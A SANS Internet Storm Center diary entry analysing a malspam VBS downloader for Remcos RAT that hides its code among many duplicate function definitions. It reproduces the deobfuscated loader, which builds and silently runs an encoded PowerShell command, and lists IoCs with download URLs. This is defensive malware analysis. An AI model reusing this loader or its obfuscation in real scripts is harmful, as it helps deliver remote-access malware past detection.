---
title: Script obfuscation using multiple instances of the same function, (Mon, Aug 5th)
url: https://isc.sans.edu/diary/rss/31144
source: SANS Internet Storm Center, InfoCON: green
date: 2024-08-06
fetch_date: 2025-10-06T18:06:03.760859
---

# Script obfuscation using multiple instances of the same function, (Mon, Aug 5th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31140)
* [next](/diary/31148)

# [Script obfuscation using multiple instances of the same function](/forums/diary/Script%2Bobfuscation%2Busing%2Bmultiple%2Binstances%2Bof%2Bthe%2Bsame%2Bfunction/31144/)

**Published**: 2024-08-05. **Last Updated**: 2024-08-05 06:01:11 UTC
**by** [Jan Kopriva](/handler_list.html#jan-kopriva) (Version: 1)

[1 comment(s)](/diary/Script%2Bobfuscation%2Busing%2Bmultiple%2Binstances%2Bof%2Bthe%2Bsame%2Bfunction/31144/#comments)

Threat actors like to make detection and analysis of any malicious code they create as difficult as possible – for obvious reasons. There are any number of techniques which they may employ in this area, nevertheless, the one approach, that is common to pretty much all threat actors, is the use of obfuscation.

Obfuscation can, of course, be done in a number of different and interesting ways – from the use of various encodings and encryption to use of garbage code and beyond – nevertheless, one doesn’t usually come across an obfuscation approach that one hasn’t seen before… Which is why it surprised me when I did have such an experience recently.

Last week, I found a malspam message with a VBS attachment (well, a LZH attachment with a VBS script inside), which turned out to be the first-stage downloader for the Remcos RAT. The VBS file was 690 kB in size, so I was expecting it to contain either a significant amount of garbage code or another (in some way encoded) file. When I opened the VBS in a text editor, it quickly became obvious that my first guess was the correct one, as most of the file was – indeed – garbage code. However, it was used in a way which I haven’t seen before.

The “garbage” in the file was made up of several repeated comments, 143 identical copies of a function called “VzkvM”, which was made up of 14 lines, and 119 identical copies of a function called “GOWdF”, which was made up of 76 lines. Somewhere between these functions and comments, the actual payload was hidden.

```

...

Function VzkvM

    ' If this is msi mode, uninstall failures are not fatal
    '
    If False = manual Then
        On Error Resume Next
    End If

    fYXCP = Session.TargetPath("ETWProviders")
    GOWdF( GetRef("UninstallProvider") )

    On Error Goto 0

End Function

...

Function VzkvM

    ' If this is msi mode, uninstall failures are not fatal
    '
    If False = manual Then
        On Error Resume Next
    End If

    fYXCP = Session.TargetPath("ETWProviders")
    GOWdF( GetRef("UninstallProvider") )

    On Error Goto 0

End Function

...
```

I have no idea why wscript.exe doesn’t throw out an error related to having multiple definitions of the same function when the file is executed, but it doesn’t. It is possible that the Windows Script Host silently overwrites the original definition when it encounters a new one, but I can’t be sure. Whatever the case, the final VBS file is executable even with multiple instances of the same functions, which therefore serve as a functional (though very simple) obfuscation mechanism.

Although, I’m certain that this technique of using multiple instances of the same functions will not be new to some of our readers, it was new to me, so I thought I would share it here along with few small recommendations on how to deal with it.

In this instance, the entire actual payload was in a single place in the file. If one expected this to be the case, one could simply generate an entropy chart for the file in question and see where peak connected to the “unique” part of the code would be…

[![](https://isc.sans.edu/diaryimages/images/24-08-05-entropy.png)](https://isc.sans.edu/diaryimages/images/24-08-05-entropy.png)

Nevertheless, since I couldn’t be sure that all important code would be in one place (and the file had over 13 thousand lines, so knowing that the peak was “somewhere near the end” would not necessarily be that useful), I decided to go the “quick and dirty” route and eliminate all duplicate lines in the file. While this approach could – of course – result in the removal of some portions of the payload along with the garbage, I would still consider it valid for the purposes of a quick initial analysis (especially since one could always go back to the original file, should this be required).

One could remove the duplicates in any number of ways, but since my preferred text editor can’t remove duplicates natively, I decided to do so with Excel – I copied the code into multiple lines of one column, removed the duplicates and re-imported the result it back into the text editor.

What remained (apart from few unique comments) was one instance of each of the aforementioned functions along with the code of the payload, which turned out to be quite simple, as you can see.

```

OOwzw = "?sD?g??J?IF?wBwR?oE?iB?I?
...
??C?9??I?gC?k??a?MF?"

euvxV = "BB???S??????H???g???wK??????C
...
sD???9BwO"

OOwzw = OOwzw + euvxV
qDebG = Mid("KEkBL?",6,1)
OOwzw = replace(OOwzw, qDebG, "A")
DNShR = StrReverse( OOwzw )
nhCZe = Mid("oigHOpower",6,5) & ("shell")
venuh = venuh & ";$ziISm;"
venuh = "$qCybe = '" &  DNShR  & "'"
venuh = venuh & (";$ziISm = $qCybe.replace('" & Mid("pobne???",6,3) & "' , 'A') ;$bQOzu = [Sy" & "stem.Text.Encod" & "ing]:")
venuh = venuh & (":Un" & "icode.GetSt" & "ring(")
venuh = venuh & ("[Sy" & "stem.Conv" & "ert]::")
venuh = venuh & ("FromBase" + "64String( $ziISm ) ); ")
venuh = venuh & ("$bQOzu = $bQOzu[-1..-$bQOzu.Length] -join '';$bQOzu = $bQOzu.replace('%XRqhI%','") & WScript.ScriptFullName & "');" & nhCZe & " $bQOzu"
execute("set iPvAu = CreateObject(""WScript.Shell"") : iPvAu.Run( """ & nhCZe & " -command """ & """" & venuh & """" & "), 0, false")
```

For the sake of completeness, it should be mentioned that the two string variables OOwzw and euvxV contained a Base64-encoded PowerShell script, which was intended to download the final payload – a variant of Remcos RAT.

**IoCs**
Payment Advice July EMHART -A2408012731R1 71-2024I BCE20240221\_11034611pdf.vbs
MD5 - 5f904f7f145d890eb9504aa4ccf1d050
SHA1 - 5638789e500e43c4f5766ba0e07114e26c5f61f9
SHA 256 - 77c2fb08ad6a1ce923022b60b8402f55adf65d65ca50236dfb94b4172e2c1513

URLs
ftp[:]//desckvbrat1@ftp[.]desckvbrat[.]com[.]br/Upcrypter/02/DLL01.txt
hxxps[:]//sharetext[.]me/raw/d3anodwv1n

-----------
Jan Kopriva
[@jk0pr](https://twitter.com/jk0pr) | [LinkedIn](https://www.linkedin.com/in/jan-kopriva/)
[Nettles Consulting](https://www.nettles.cz/)

Keywords:

[1 comment(s)](/diary/Script%2Bobfuscation%2Busing%2Bmultiple%2Binstances%2Bof%2Bthe%2Bsame%2Bfunction/31144/#comments)

* [previous](/diary/31140)
* [next](/diary/31148)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mas...